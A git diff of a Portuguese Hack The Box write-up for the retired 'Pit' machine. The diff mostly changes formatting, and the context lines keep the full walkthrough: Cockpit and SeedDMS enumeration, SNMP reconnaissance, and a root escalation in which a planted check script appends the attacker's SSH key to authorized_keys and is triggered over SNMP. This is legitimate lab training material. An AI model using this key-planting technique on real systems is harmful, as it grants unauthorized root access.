@@ -19,8 +19,9 @@ Olá pessoal!
 
 A máquina desta semana será **Pit**, outra máquina Linux classificada como mediana [Hack The Box](https://www.hackthebox.eu/), criada por [polarbearer](https://app.hackthebox.eu/users/159204) e [GibParadox](https://app.hackthebox.eu/users/125033).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
+</Alert>
 
 ![HTB Pit](https://i.imgur.com/pFwxqgv.png)
 
@@ -142,9 +143,9 @@ Acessando as páginas, podemos ver na URI `http://10.10.10.241:80` a página pad
 
 ![HTB Pit - Cockpit login page](https://i.imgur.com/ldyoAq7.png)
 
-Cockpit é uma interface web para administração Linux e, como o nome da máquina é parte do nome da solução, devo estar no caminho correto \:smile:.  O domínio `pit.htb` é mencionado como nome da máquina, também incluído no arquivo hosts local.
+Cockpit é uma interface web para administração Linux e, como o nome da máquina é parte do nome da solução, devo estar no caminho correto \:smile:. O domínio `pit.htb` é mencionado como nome da máquina, também incluído no arquivo hosts local.
 
-Buscando por vulnerabilidades para este produto, encontrei uma vulnerabilidade para SSRF na versão 234 a partir de uma pesquina no  `searchsploit`, que poderia de alguma forma ser útil uma vez que não depende de nenhuma credencial.
+Buscando por vulnerabilidades para este produto, encontrei uma vulnerabilidade para SSRF na versão 234 a partir de uma pesquina no `searchsploit`, que poderia de alguma forma ser útil uma vez que não depende de nenhuma credencial.
 
 ```bash
 $ searchsploit cockpit
@@ -187,7 +188,7 @@ for host in "${hosts[@]}"; do
 done
 ```
 
-Avaliando os resultados, encontrei algo interessante: quando acessamos o domínio `dms-pit.htb` recebemos um erro  **403 Forbidden**, cenário ideal para usar a vulnerabilidade de SSRF no Cockpit, se presente \:smile:
+Avaliando os resultados, encontrei algo interessante: quando acessamos o domínio `dms-pit.htb` recebemos um erro **403 Forbidden**, cenário ideal para usar a vulnerabilidade de SSRF no Cockpit, se presente \:smile:
 
 ```plaintext
 http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]
@@ -302,7 +303,7 @@ iso.3.6.1.4.1.2021.9.1.6.2 = INTEGER: 125600
 iso.3.6.1.4.1.2021.9.1.7.1 = INTEGER: 374736
 ```
 
-Retornei para o browser e tentei algumas combinações de dominios com o caminho virtual provável, onde obtive acesso ao  endereço `http://dms-pit.htb/seeddms51x/seeddms` onde o portal do **SeedDMS** se encontrava disponível.
+Retornei para o browser e tentei algumas combinações de dominios com o caminho virtual provável, onde obtive acesso ao endereço `http://dms-pit.htb/seeddms51x/seeddms` onde o portal do **SeedDMS** se encontrava disponível.
 
 ![HTB Pit - SeedDMS](https://i.imgur.com/PsX5dm0.png)
 
@@ -392,7 +393,7 @@ Como temos as credenciais de banco de dados, lembrei que poderiamos utilizá-las
 Acessando o terminal via portal web, fui capaz de acessar o conteúdo do arquivo `user.txt` e obter a flag
 
 ```bash
-[michelle@pit ~]$ ls 
+[michelle@pit ~]$ ls
 check.sh  user.txt
 [michelle@pit ~]$ cat user.txt
 <redacted>
@@ -410,7 +411,7 @@ USER   root      rwx
 user   michelle  -wx
 GROUP  root      rwx
 mask             rwx
-other            ---                  
+other            ---
 ```
 
 Inspecionando este arquivo, na verdade descobri que se tratava de um diretório, o qual não temos acesso de leitura (apenas escrita e execução vide output acima). Buscando por outros arquivos que fizessem referência a este diretório, executei um `grep` recursivo no sistema, onde encontrei um arquivo previamente observado no scan do `snmpwalk`.
@@ -418,7 +419,7 @@ Inspecionando este arquivo, na verdade descobri que se tratava de um diretório,
 ```bash
 [michelle@pit local]$ grep -r "/usr/local/monitoring/"  / 2>/dev/null
 /usr/bin/monitor:for script in /usr/local/monitoring/check*sh
-[michelle@pit local]$ cat /usr/bin/monitor 
+[michelle@pit local]$ cat /usr/bin/monitor
 #!/bin/bash
 
 for script in /usr/local/monitoring/check*sh
@@ -442,21 +443,21 @@ De acordo com o guia em [SNMP RCE - HackTricks](https://book.hacktricks.xyz/pent
 
 Com base nas informações levantadas, temos uma possível forma de obter acesso `root`, onde os seguintes passos foram utilizados:
 
-* Criei um arquivo  `checkXXXX.sh`, que adiciona uma chave pública como confiável dentro do arquivo `authorized_keys` do perfil que executa o processo e copiado para `/usr/bin/monitor`.
+- Criei um arquivo `checkXXXX.sh`, que adiciona uma chave pública como confiável dentro do arquivo `authorized_keys` do perfil que executa o processo e copiado para `/usr/bin/monitor`.
 
 ```bash
 #!/bin/bash
 echo "ssh-rsa <base64PubKey> root@kali" >> ~/.ssh/authorized_keys
 ```
 
-* A partir da máquina do atacante, iniciei a ação para executar as ações nsExtendedObject
+- A partir da máquina do atacante, iniciei a ação para executar as ações nsExtendedObject
 
 ```bash
 # Trigger Extended objects
 snmpwalk -v 1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
 ```
 
-* Após este ponto, consegui me conectar utilizando a chave privada correspondente via SSH com a conta do usuário `root`, onde consegui obter a flag final.
+- Após este ponto, consegui me conectar utilizando a chave privada correspondente via SSH com a conta do usuário `root`, onde consegui obter a flag final.
 
 ```bash
 $ ssh -i pit root@10.10.10.241
